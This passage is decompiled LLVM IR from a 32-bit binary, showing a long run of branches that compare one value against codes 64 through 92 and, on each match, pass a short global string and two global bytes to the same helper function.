  br i1 %v1_804a9f2, label %dec_label_pc_804aa1e, label %dec_label_pc_804a9f4

dec_label_pc_804a9f4:                             ; preds = %dec_label_pc_804a9ee
  %v0_804a9f4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a9f4 = zext i8 %v0_804a9f4 to i32
  store i32 %v1_804a9f4, i32* @edx, align 4
  %v0_804aa00 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804aa00 = zext i8 %v0_804aa00 to i32
  %v2_804aa0f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa0f, i32* @ebx, align 4
  %v5_804aa16 = call i32 @function_8048b5b(i32 %v2_804aa0f, i32 ptrtoint ([14 x i8]* @global_var_805a262.106 to i32), i32 %v1_804aa00, i32 %v1_804a9f4)
  br label %dec_label_pc_804aa1e

dec_label_pc_804aa1e:                             ; preds = %dec_label_pc_804a9ee, %dec_label_pc_804a9f4
  %v9_804aa1e = icmp eq i32 %v11_8049e19, 64
  %v1_804aa22 = icmp eq i1 %v9_804aa1e, false
  br i1 %v1_804aa22, label %dec_label_pc_804aa4e, label %dec_label_pc_804aa24

dec_label_pc_804aa24:                             ; preds = %dec_label_pc_804aa1e
  %v0_804aa24 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804aa24 = zext i8 %v0_804aa24 to i32
  store i32 %v1_804aa24, i32* @edx, align 4
  %v0_804aa30 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804aa30 = zext i8 %v0_804aa30 to i32
  %v2_804aa3f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa3f, i32* @ebx, align 4
  %v5_804aa46 = call i32 @function_8048b5b(i32 %v2_804aa3f, i32 ptrtoint ([13 x i8]* @global_var_805a270.107 to i32), i32 %v1_804aa30, i32 %v1_804aa24)
  br label %dec_label_pc_804aa4e

dec_label_pc_804aa4e:                             ; preds = %dec_label_pc_804aa1e, %dec_label_pc_804aa24
  %v12_804aa4e = icmp eq i32 %v11_8049e19, 65
  %v1_804aa52 = icmp eq i1 %v12_804aa4e, false
  br i1 %v1_804aa52, label %dec_label_pc_804aa7e, label %dec_label_pc_804aa54

dec_label_pc_804aa54:                             ; preds = %dec_label_pc_804aa4e
  %v0_804aa54 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804aa54 = zext i8 %v0_804aa54 to i32
  store i32 %v1_804aa54, i32* @edx, align 4
  %v0_804aa60 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804aa60 = zext i8 %v0_804aa60 to i32
  %v2_804aa6f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa6f, i32* @ebx, align 4
  %v5_804aa76 = call i32 @function_8048b5b(i32 %v2_804aa6f, i32 ptrtoint ([13 x i8]* @global_var_805a27d.108 to i32), i32 %v1_804aa60, i32 %v1_804aa54)
  br label %dec_label_pc_804aa7e

dec_label_pc_804aa7e:                             ; preds = %dec_label_pc_804aa4e, %dec_label_pc_804aa54
  %v12_804aa7e = icmp eq i32 %v11_8049e19, 66
  %v1_804aa82 = icmp eq i1 %v12_804aa7e, false
  br i1 %v1_804aa82, label %dec_label_pc_804aaae, label %dec_label_pc_804aa84

dec_label_pc_804aa84:                             ; preds = %dec_label_pc_804aa7e
  %v0_804aa84 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804aa84 = zext i8 %v0_804aa84 to i32
  store i32 %v1_804aa84, i32* @edx, align 4
  %v0_804aa90 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804aa90 = zext i8 %v0_804aa90 to i32
  %v2_804aa9f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa9f, i32* @ebx, align 4
  %v5_804aaa6 = call i32 @function_8048b5b(i32 %v2_804aa9f, i32 ptrtoint ([13 x i8]* @global_var_805a28a.109 to i32), i32 %v1_804aa90, i32 %v1_804aa84)
  br label %dec_label_pc_804aaae

dec_label_pc_804aaae:                             ; preds = %dec_label_pc_804aa7e, %dec_label_pc_804aa84
  %v12_804aaae = icmp eq i32 %v11_8049e19, 67
  %v1_804aab2 = icmp eq i1 %v12_804aaae, false
  br i1 %v1_804aab2, label %dec_label_pc_804aade, label %dec_label_pc_804aab4

dec_label_pc_804aab4:                             ; preds = %dec_label_pc_804aaae
  %v0_804aab4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804aab4 = zext i8 %v0_804aab4 to i32
  store i32 %v1_804aab4, i32* @edx, align 4
  %v0_804aac0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804aac0 = zext i8 %v0_804aac0 to i32
  %v2_804aacf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aacf, i32* @ebx, align 4
  %v5_804aad6 = call i32 @function_8048b5b(i32 %v2_804aacf, i32 ptrtoint ([12 x i8]* @global_var_805a297.110 to i32), i32 %v1_804aac0, i32 %v1_804aab4)
  br label %dec_label_pc_804aade

dec_label_pc_804aade:                             ; preds = %dec_label_pc_804aaae, %dec_label_pc_804aab4
  %v12_804aade = icmp eq i32 %v11_8049e19, 68
  %v1_804aae2 = icmp eq i1 %v12_804aade, false
  br i1 %v1_804aae2, label %dec_label_pc_804ab0e, label %dec_label_pc_804aae4

dec_label_pc_804aae4:                             ; preds = %dec_label_pc_804aade
  %v0_804aae4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804aae4 = zext i8 %v0_804aae4 to i32
  store i32 %v1_804aae4, i32* @edx, align 4
  %v0_804aaf0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804aaf0 = zext i8 %v0_804aaf0 to i32
  %v2_804aaff = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aaff, i32* @ebx, align 4
  %v5_804ab06 = call i32 @function_8048b5b(i32 %v2_804aaff, i32 ptrtoint ([13 x i8]* @global_var_805a2a3.111 to i32), i32 %v1_804aaf0, i32 %v1_804aae4)
  br label %dec_label_pc_804ab0e

dec_label_pc_804ab0e:                             ; preds = %dec_label_pc_804aade, %dec_label_pc_804aae4
  %v12_804ab0e = icmp eq i32 %v11_8049e19, 69
  %v1_804ab12 = icmp eq i1 %v12_804ab0e, false
  br i1 %v1_804ab12, label %dec_label_pc_804ab3e, label %dec_label_pc_804ab14

dec_label_pc_804ab14:                             ; preds = %dec_label_pc_804ab0e
  %v0_804ab14 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804ab14 = zext i8 %v0_804ab14 to i32
  store i32 %v1_804ab14, i32* @edx, align 4
  %v0_804ab20 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804ab20 = zext i8 %v0_804ab20 to i32
  %v2_804ab2f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab2f, i32* @ebx, align 4
  %v5_804ab36 = call i32 @function_8048b5b(i32 %v2_804ab2f, i32 ptrtoint ([13 x i8]* @global_var_805a2b0.112 to i32), i32 %v1_804ab20, i32 %v1_804ab14)
  br label %dec_label_pc_804ab3e

dec_label_pc_804ab3e:                             ; preds = %dec_label_pc_804ab0e, %dec_label_pc_804ab14
  %v12_804ab3e = icmp eq i32 %v11_8049e19, 70
  %v1_804ab42 = icmp eq i1 %v12_804ab3e, false
  br i1 %v1_804ab42, label %dec_label_pc_804ab6e, label %dec_label_pc_804ab44

dec_label_pc_804ab44:                             ; preds = %dec_label_pc_804ab3e
  %v0_804ab44 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804ab44 = zext i8 %v0_804ab44 to i32
  store i32 %v1_804ab44, i32* @edx, align 4
  %v0_804ab50 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804ab50 = zext i8 %v0_804ab50 to i32
  %v2_804ab5f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab5f, i32* @ebx, align 4
  %v5_804ab66 = call i32 @function_8048b5b(i32 %v2_804ab5f, i32 ptrtoint ([13 x i8]* @global_var_805a2bd.113 to i32), i32 %v1_804ab50, i32 %v1_804ab44)
  br label %dec_label_pc_804ab6e

dec_label_pc_804ab6e:                             ; preds = %dec_label_pc_804ab3e, %dec_label_pc_804ab44
  %v12_804ab6e = icmp eq i32 %v11_8049e19, 71
  %v1_804ab72 = icmp eq i1 %v12_804ab6e, false
  br i1 %v1_804ab72, label %dec_label_pc_804ab9e, label %dec_label_pc_804ab74

dec_label_pc_804ab74:                             ; preds = %dec_label_pc_804ab6e
  %v0_804ab74 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804ab74 = zext i8 %v0_804ab74 to i32
  store i32 %v1_804ab74, i32* @edx, align 4
  %v0_804ab80 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804ab80 = zext i8 %v0_804ab80 to i32
  %v2_804ab8f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab8f, i32* @ebx, align 4
  %v5_804ab96 = call i32 @function_8048b5b(i32 %v2_804ab8f, i32 ptrtoint ([13 x i8]* @global_var_805a2ca.114 to i32), i32 %v1_804ab80, i32 %v1_804ab74)
  br label %dec_label_pc_804ab9e

dec_label_pc_804ab9e:                             ; preds = %dec_label_pc_804ab6e, %dec_label_pc_804ab74
  %v12_804ab9e = icmp eq i32 %v11_8049e19, 72
  %v1_804aba2 = icmp eq i1 %v12_804ab9e, false
  br i1 %v1_804aba2, label %dec_label_pc_804abce, label %dec_label_pc_804aba4

dec_label_pc_804aba4:                             ; preds = %dec_label_pc_804ab9e
  %v0_804aba4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804aba4 = zext i8 %v0_804aba4 to i32
  store i32 %v1_804aba4, i32* @edx, align 4
  %v0_804abb0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804abb0 = zext i8 %v0_804abb0 to i32
  %v2_804abbf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abbf, i32* @ebx, align 4
  %v5_804abc6 = call i32 @function_8048b5b(i32 %v2_804abbf, i32 ptrtoint ([13 x i8]* @global_var_805a2d7.115 to i32), i32 %v1_804abb0, i32 %v1_804aba4)
  br label %dec_label_pc_804abce

dec_label_pc_804abce:                             ; preds = %dec_label_pc_804ab9e, %dec_label_pc_804aba4
  %v12_804abce = icmp eq i32 %v11_8049e19, 73
  %v1_804abd2 = icmp eq i1 %v12_804abce, false
  br i1 %v1_804abd2, label %dec_label_pc_804abfe, label %dec_label_pc_804abd4

dec_label_pc_804abd4:                             ; preds = %dec_label_pc_804abce
  %v0_804abd4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804abd4 = zext i8 %v0_804abd4 to i32
  store i32 %v1_804abd4, i32* @edx, align 4
  %v0_804abe0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804abe0 = zext i8 %v0_804abe0 to i32
  %v2_804abef = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abef, i32* @ebx, align 4
  %v5_804abf6 = call i32 @function_8048b5b(i32 %v2_804abef, i32 ptrtoint ([13 x i8]* @global_var_805a2e4.116 to i32), i32 %v1_804abe0, i32 %v1_804abd4)
  br label %dec_label_pc_804abfe

dec_label_pc_804abfe:                             ; preds = %dec_label_pc_804abce, %dec_label_pc_804abd4
  %v12_804abfe = icmp eq i32 %v11_8049e19, 74
  %v1_804ac02 = icmp eq i1 %v12_804abfe, false
  br i1 %v1_804ac02, label %dec_label_pc_804ac2e, label %dec_label_pc_804ac04

dec_label_pc_804ac04:                             ; preds = %dec_label_pc_804abfe
  %v0_804ac04 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804ac04 = zext i8 %v0_804ac04 to i32
  store i32 %v1_804ac04, i32* @edx, align 4
  %v0_804ac10 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804ac10 = zext i8 %v0_804ac10 to i32
  %v2_804ac1f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac1f, i32* @ebx, align 4
  %v5_804ac26 = call i32 @function_8048b5b(i32 %v2_804ac1f, i32 ptrtoint ([12 x i8]* @global_var_805a2f1.117 to i32), i32 %v1_804ac10, i32 %v1_804ac04)
  br label %dec_label_pc_804ac2e

dec_label_pc_804ac2e:                             ; preds = %dec_label_pc_804abfe, %dec_label_pc_804ac04
  %v12_804ac2e = icmp eq i32 %v11_8049e19, 75
  %v1_804ac32 = icmp eq i1 %v12_804ac2e, false
  br i1 %v1_804ac32, label %dec_label_pc_804ac5e, label %dec_label_pc_804ac34

dec_label_pc_804ac34:                             ; preds = %dec_label_pc_804ac2e
  %v0_804ac34 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804ac34 = zext i8 %v0_804ac34 to i32
  store i32 %v1_804ac34, i32* @edx, align 4
  %v0_804ac40 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804ac40 = zext i8 %v0_804ac40 to i32
  %v2_804ac4f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac4f, i32* @ebx, align 4
  %v5_804ac56 = call i32 @function_8048b5b(i32 %v2_804ac4f, i32 ptrtoint ([14 x i8]* @global_var_805a2fd.118 to i32), i32 %v1_804ac40, i32 %v1_804ac34)
  br label %dec_label_pc_804ac5e

dec_label_pc_804ac5e:                             ; preds = %dec_label_pc_804ac2e, %dec_label_pc_804ac34
  %v12_804ac5e = icmp eq i32 %v11_8049e19, 76
  %v1_804ac62 = icmp eq i1 %v12_804ac5e, false
  br i1 %v1_804ac62, label %dec_label_pc_804ac8e, label %dec_label_pc_804ac64

dec_label_pc_804ac64:                             ; preds = %dec_label_pc_804ac5e
  %v0_804ac64 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804ac64 = zext i8 %v0_804ac64 to i32
  store i32 %v1_804ac64, i32* @edx, align 4
  %v0_804ac70 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804ac70 = zext i8 %v0_804ac70 to i32
  %v2_804ac7f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac7f, i32* @ebx, align 4
  %v5_804ac86 = call i32 @function_8048b5b(i32 %v2_804ac7f, i32 ptrtoint ([11 x i8]* @global_var_805a30b.119 to i32), i32 %v1_804ac70, i32 %v1_804ac64)
  br label %dec_label_pc_804ac8e

dec_label_pc_804ac8e:                             ; preds = %dec_label_pc_804ac5e, %dec_label_pc_804ac64
  %v12_804ac8e = icmp eq i32 %v11_8049e19, 77
  %v1_804ac92 = icmp eq i1 %v12_804ac8e, false
  br i1 %v1_804ac92, label %dec_label_pc_804acbe, label %dec_label_pc_804ac94

dec_label_pc_804ac94:                             ; preds = %dec_label_pc_804ac8e
  %v0_804ac94 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804ac94 = zext i8 %v0_804ac94 to i32
  store i32 %v1_804ac94, i32* @edx, align 4
  %v0_804aca0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804aca0 = zext i8 %v0_804aca0 to i32
  %v2_804acaf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804acaf, i32* @ebx, align 4
  %v5_804acb6 = call i32 @function_8048b5b(i32 %v2_804acaf, i32 ptrtoint ([13 x i8]* @global_var_805a316.120 to i32), i32 %v1_804aca0, i32 %v1_804ac94)
  br label %dec_label_pc_804acbe

dec_label_pc_804acbe:                             ; preds = %dec_label_pc_804ac8e, %dec_label_pc_804ac94
  %v12_804acbe = icmp eq i32 %v11_8049e19, 78
  %v1_804acc2 = icmp eq i1 %v12_804acbe, false
  br i1 %v1_804acc2, label %dec_label_pc_804acee, label %dec_label_pc_804acc4

dec_label_pc_804acc4:                             ; preds = %dec_label_pc_804acbe
  %v0_804acc4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804acc4 = zext i8 %v0_804acc4 to i32
  store i32 %v1_804acc4, i32* @edx, align 4
  %v0_804acd0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804acd0 = zext i8 %v0_804acd0 to i32
  %v2_804acdf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804acdf, i32* @ebx, align 4
  %v5_804ace6 = call i32 @function_8048b5b(i32 %v2_804acdf, i32 ptrtoint ([11 x i8]* @global_var_805a323.121 to i32), i32 %v1_804acd0, i32 %v1_804acc4)
  br label %dec_label_pc_804acee

dec_label_pc_804acee:                             ; preds = %dec_label_pc_804acbe, %dec_label_pc_804acc4
  %v12_804acee = icmp eq i32 %v11_8049e19, 79
  %v1_804acf2 = icmp eq i1 %v12_804acee, false
  br i1 %v1_804acf2, label %dec_label_pc_804ad1e, label %dec_label_pc_804acf4

dec_label_pc_804acf4:                             ; preds = %dec_label_pc_804acee
  %v0_804acf4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804acf4 = zext i8 %v0_804acf4 to i32
  store i32 %v1_804acf4, i32* @edx, align 4
  %v0_804ad00 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804ad00 = zext i8 %v0_804ad00 to i32
  %v2_804ad0f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad0f, i32* @ebx, align 4
  %v5_804ad16 = call i32 @function_8048b5b(i32 %v2_804ad0f, i32 ptrtoint ([13 x i8]* @global_var_805a32e.122 to i32), i32 %v1_804ad00, i32 %v1_804acf4)
  br label %dec_label_pc_804ad1e

dec_label_pc_804ad1e:                             ; preds = %dec_label_pc_804acee, %dec_label_pc_804acf4
  %v9_804ad1e = icmp eq i32 %v11_8049e19, 80
  %v1_804ad22 = icmp eq i1 %v9_804ad1e, false
  br i1 %v1_804ad22, label %dec_label_pc_804ad4e, label %dec_label_pc_804ad24

dec_label_pc_804ad24:                             ; preds = %dec_label_pc_804ad1e
  %v0_804ad24 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804ad24 = zext i8 %v0_804ad24 to i32
  store i32 %v1_804ad24, i32* @edx, align 4
  %v0_804ad30 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804ad30 = zext i8 %v0_804ad30 to i32
  %v2_804ad3f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad3f, i32* @ebx, align 4
  %v5_804ad46 = call i32 @function_8048b5b(i32 %v2_804ad3f, i32 ptrtoint ([12 x i8]* @global_var_805a33b.123 to i32), i32 %v1_804ad30, i32 %v1_804ad24)
  br label %dec_label_pc_804ad4e

dec_label_pc_804ad4e:                             ; preds = %dec_label_pc_804ad1e, %dec_label_pc_804ad24
  %v12_804ad4e = icmp eq i32 %v11_8049e19, 81
  %v1_804ad52 = icmp eq i1 %v12_804ad4e, false
  br i1 %v1_804ad52, label %dec_label_pc_804ad7e, label %dec_label_pc_804ad54

dec_label_pc_804ad54:                             ; preds = %dec_label_pc_804ad4e
  %v0_804ad54 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804ad54 = zext i8 %v0_804ad54 to i32
  store i32 %v1_804ad54, i32* @edx, align 4
  %v0_804ad60 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804ad60 = zext i8 %v0_804ad60 to i32
  %v2_804ad6f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad6f, i32* @ebx, align 4
  %v5_804ad76 = call i32 @function_8048b5b(i32 %v2_804ad6f, i32 ptrtoint ([13 x i8]* @global_var_805a347.124 to i32), i32 %v1_804ad60, i32 %v1_804ad54)
  br label %dec_label_pc_804ad7e

dec_label_pc_804ad7e:                             ; preds = %dec_label_pc_804ad4e, %dec_label_pc_804ad54
  %v12_804ad7e = icmp eq i32 %v11_8049e19, 82
  %v1_804ad82 = icmp eq i1 %v12_804ad7e, false
  br i1 %v1_804ad82, label %dec_label_pc_804adae, label %dec_label_pc_804ad84

dec_label_pc_804ad84:                             ; preds = %dec_label_pc_804ad7e
  %v0_804ad84 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804ad84 = zext i8 %v0_804ad84 to i32
  store i32 %v1_804ad84, i32* @edx, align 4
  %v0_804ad90 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804ad90 = zext i8 %v0_804ad90 to i32
  %v2_804ad9f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad9f, i32* @ebx, align 4
  %v5_804ada6 = call i32 @function_8048b5b(i32 %v2_804ad9f, i32 ptrtoint ([13 x i8]* @global_var_805a354.125 to i32), i32 %v1_804ad90, i32 %v1_804ad84)
  br label %dec_label_pc_804adae

dec_label_pc_804adae:                             ; preds = %dec_label_pc_804ad7e, %dec_label_pc_804ad84
  %v12_804adae = icmp eq i32 %v11_8049e19, 83
  %v1_804adb2 = icmp eq i1 %v12_804adae, false
  br i1 %v1_804adb2, label %dec_label_pc_804adde, label %dec_label_pc_804adb4

dec_label_pc_804adb4:                             ; preds = %dec_label_pc_804adae
  %v0_804adb4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804adb4 = zext i8 %v0_804adb4 to i32
  store i32 %v1_804adb4, i32* @edx, align 4
  %v0_804adc0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804adc0 = zext i8 %v0_804adc0 to i32
  %v2_804adcf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804adcf, i32* @ebx, align 4
  %v5_804add6 = call i32 @function_8048b5b(i32 %v2_804adcf, i32 ptrtoint ([13 x i8]* @global_var_805a361.126 to i32), i32 %v1_804adc0, i32 %v1_804adb4)
  br label %dec_label_pc_804adde

dec_label_pc_804adde:                             ; preds = %dec_label_pc_804adae, %dec_label_pc_804adb4
  %v12_804adde = icmp eq i32 %v11_8049e19, 84
  %v1_804ade2 = icmp eq i1 %v12_804adde, false
  br i1 %v1_804ade2, label %dec_label_pc_804ae0e, label %dec_label_pc_804ade4

dec_label_pc_804ade4:                             ; preds = %dec_label_pc_804adde
  %v0_804ade4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804ade4 = zext i8 %v0_804ade4 to i32
  store i32 %v1_804ade4, i32* @edx, align 4
  %v0_804adf0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804adf0 = zext i8 %v0_804adf0 to i32
  %v2_804adff = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804adff, i32* @ebx, align 4
  %v5_804ae06 = call i32 @function_8048b5b(i32 %v2_804adff, i32 ptrtoint ([14 x i8]* @global_var_805a36e.127 to i32), i32 %v1_804adf0, i32 %v1_804ade4)
  br label %dec_label_pc_804ae0e

dec_label_pc_804ae0e:                             ; preds = %dec_label_pc_804adde, %dec_label_pc_804ade4
  %v12_804ae0e = icmp eq i32 %v11_8049e19, 85
  %v1_804ae12 = icmp eq i1 %v12_804ae0e, false
  br i1 %v1_804ae12, label %dec_label_pc_804ae3e, label %dec_label_pc_804ae14

dec_label_pc_804ae14:                             ; preds = %dec_label_pc_804ae0e
  %v0_804ae14 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804ae14 = zext i8 %v0_804ae14 to i32
  store i32 %v1_804ae14, i32* @edx, align 4
  %v0_804ae20 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804ae20 = zext i8 %v0_804ae20 to i32
  %v2_804ae2f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae2f, i32* @ebx, align 4
  %v5_804ae36 = call i32 @function_8048b5b(i32 %v2_804ae2f, i32 ptrtoint ([11 x i8]* @global_var_805a37c.128 to i32), i32 %v1_804ae20, i32 %v1_804ae14)
  br label %dec_label_pc_804ae3e

dec_label_pc_804ae3e:                             ; preds = %dec_label_pc_804ae0e, %dec_label_pc_804ae14
  %v12_804ae3e = icmp eq i32 %v11_8049e19, 86
  %v1_804ae42 = icmp eq i1 %v12_804ae3e, false
  br i1 %v1_804ae42, label %dec_label_pc_804ae6e, label %dec_label_pc_804ae44

dec_label_pc_804ae44:                             ; preds = %dec_label_pc_804ae3e
  %v0_804ae44 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804ae44 = zext i8 %v0_804ae44 to i32
  store i32 %v1_804ae44, i32* @edx, align 4
  %v0_804ae50 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804ae50 = zext i8 %v0_804ae50 to i32
  %v2_804ae5f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae5f, i32* @ebx, align 4
  %v5_804ae66 = call i32 @function_8048b5b(i32 %v2_804ae5f, i32 ptrtoint ([13 x i8]* @global_var_805a387.129 to i32), i32 %v1_804ae50, i32 %v1_804ae44)
  br label %dec_label_pc_804ae6e

dec_label_pc_804ae6e:                             ; preds = %dec_label_pc_804ae3e, %dec_label_pc_804ae44
  %v12_804ae6e = icmp eq i32 %v11_8049e19, 87
  %v1_804ae72 = icmp eq i1 %v12_804ae6e, false
  br i1 %v1_804ae72, label %dec_label_pc_804ae9e, label %dec_label_pc_804ae74

dec_label_pc_804ae74:                             ; preds = %dec_label_pc_804ae6e
  %v0_804ae74 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804ae74 = zext i8 %v0_804ae74 to i32
  store i32 %v1_804ae74, i32* @edx, align 4
  %v0_804ae80 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804ae80 = zext i8 %v0_804ae80 to i32
  %v2_804ae8f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae8f, i32* @ebx, align 4
  %v5_804ae96 = call i32 @function_8048b5b(i32 %v2_804ae8f, i32 ptrtoint ([13 x i8]* @global_var_805a394.130 to i32), i32 %v1_804ae80, i32 %v1_804ae74)
  br label %dec_label_pc_804ae9e

dec_label_pc_804ae9e:                             ; preds = %dec_label_pc_804ae6e, %dec_label_pc_804ae74
  %v12_804ae9e = icmp eq i32 %v11_8049e19, 88
  %v1_804aea2 = icmp eq i1 %v12_804ae9e, false
  br i1 %v1_804aea2, label %dec_label_pc_804aece, label %dec_label_pc_804aea4

dec_label_pc_804aea4:                             ; preds = %dec_label_pc_804ae9e
  %v0_804aea4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804aea4 = zext i8 %v0_804aea4 to i32
  store i32 %v1_804aea4, i32* @edx, align 4
  %v0_804aeb0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804aeb0 = zext i8 %v0_804aeb0 to i32
  %v2_804aebf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aebf, i32* @ebx, align 4
  %v5_804aec6 = call i32 @function_8048b5b(i32 %v2_804aebf, i32 ptrtoint ([13 x i8]* @global_var_805a3a1.131 to i32), i32 %v1_804aeb0, i32 %v1_804aea4)
  br label %dec_label_pc_804aece

dec_label_pc_804aece:                             ; preds = %dec_label_pc_804ae9e, %dec_label_pc_804aea4
  %v12_804aece = icmp eq i32 %v11_8049e19, 89
  %v1_804aed2 = icmp eq i1 %v12_804aece, false
  br i1 %v1_804aed2, label %dec_label_pc_804aefe, label %dec_label_pc_804aed4

dec_label_pc_804aed4:                             ; preds = %dec_label_pc_804aece
  %v0_804aed4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804aed4 = zext i8 %v0_804aed4 to i32
  store i32 %v1_804aed4, i32* @edx, align 4
  %v0_804aee0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804aee0 = zext i8 %v0_804aee0 to i32
  %v2_804aeef = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aeef, i32* @ebx, align 4
  %v5_804aef6 = call i32 @function_8048b5b(i32 %v2_804aeef, i32 ptrtoint ([13 x i8]* @global_var_805a3ae.132 to i32), i32 %v1_804aee0, i32 %v1_804aed4)
  br label %dec_label_pc_804aefe

dec_label_pc_804aefe:                             ; preds = %dec_label_pc_804aece, %dec_label_pc_804aed4
  %v12_804aefe = icmp eq i32 %v11_8049e19, 90
  %v1_804af02 = icmp eq i1 %v12_804aefe, false
  br i1 %v1_804af02, label %dec_label_pc_804af2e, label %dec_label_pc_804af04

dec_label_pc_804af04:                             ; preds = %dec_label_pc_804aefe
  %v0_804af04 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804af04 = zext i8 %v0_804af04 to i32
  store i32 %v1_804af04, i32* @edx, align 4
  %v0_804af10 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804af10 = zext i8 %v0_804af10 to i32
  %v2_804af1f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af1f, i32* @ebx, align 4
  %v5_804af26 = call i32 @function_8048b5b(i32 %v2_804af1f, i32 ptrtoint ([11 x i8]* @global_var_805a3bb.133 to i32), i32 %v1_804af10, i32 %v1_804af04)
  br label %dec_label_pc_804af2e

dec_label_pc_804af2e:                             ; preds = %dec_label_pc_804aefe, %dec_label_pc_804af04
  %v12_804af2e = icmp eq i32 %v11_8049e19, 91
  %v1_804af32 = icmp eq i1 %v12_804af2e, false
  br i1 %v1_804af32, label %dec_label_pc_804af5e, label %dec_label_pc_804af34

dec_label_pc_804af34:                             ; preds = %dec_label_pc_804af2e
  %v0_804af34 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804af34 = zext i8 %v0_804af34 to i32
  store i32 %v1_804af34, i32* @edx, align 4
  %v0_804af40 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804af40 = zext i8 %v0_804af40 to i32
  %v2_804af4f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af4f, i32* @ebx, align 4
  %v5_804af56 = call i32 @function_8048b5b(i32 %v2_804af4f, i32 ptrtoint ([12 x i8]* @global_var_805a3c6.134 to i32), i32 %v1_804af40, i32 %v1_804af34)
  br label %dec_label_pc_804af5e

dec_label_pc_804af5e:                             ; preds = %dec_label_pc_804af2e, %dec_label_pc_804af34
  %v12_804af5e = icmp eq i32 %v11_8049e19, 92
  %v1_804af62 = icmp eq i1 %v12_804af5e, false
  br i1 %v1_804af62, label %dec_label_pc_804af8e, label %dec_label_pc_804af64

dec_label_pc_804af64:                             ; preds = %dec_label_pc_804af5e
  %v0_804af64 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804af64 = zext i8 %v0_804af64 to i32
